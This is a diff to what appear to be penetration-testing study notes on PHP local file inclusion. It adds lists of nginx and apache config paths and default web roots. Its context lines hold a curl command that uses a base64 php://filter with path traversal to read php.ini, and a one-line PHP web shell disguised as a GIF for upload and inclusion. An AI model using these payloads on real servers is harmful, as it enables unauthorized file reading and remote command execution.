@@ -18,6 +18,8 @@ The [`data`](https://www.php.net/manual/en/wrappers.data.php) wrapper allows inc
 
 To check this option on the PHP configuration file found at (`/etc/php/X.Y/apache2/php.ini`) for Apache or at (`/etc/php/X.Y/fpm/php.ini`) for Nginx, where `X.Y` is your install PHP version
 
+***to get the php version + web root path => ***`/etc/nginx/sites-enabled/default`
+
 use LFI with the **base64 filter** to check this configuration: 
 ```bash
 curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
@@ -194,6 +196,37 @@ echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
 
 Once uploaded, we can include it via LFI to execute code.
 ###### Finding the Uploaded File Path
+find the web root path :
+```bash
+# NGINX
+# ------------------------------
+Default Config Files:
+/etc/nginx/nginx.conf
+/etc/nginx/sites-available/default
+/etc/nginx/sites-enabled/default
+
+Default Web Root (Debian/Ubuntu):
+/var/www/html
+
+Default Web Root (CentOS/RHEL):
+/usr/share/nginx/html
+
+
+# APACHE (apache2 / httpd)
+# ------------------------------
+Default Config Files (Debian/Ubuntu):
+/etc/apache2/apache2.conf
+/etc/apache2/sites-available/000-default.conf
+/etc/apache2/sites-enabled/000-default.conf
+
+Default Config Files (CentOS/RHEL):
+/etc/httpd/conf/httpd.conf
+/etc/httpd/conf.d/*.conf
+
+Default Web Root:
+/var/www/html
+```
+
 After upload, check the page source for the image URL:
 ```html
 <img src="/profile_images/shell.gif" class="profile-image">
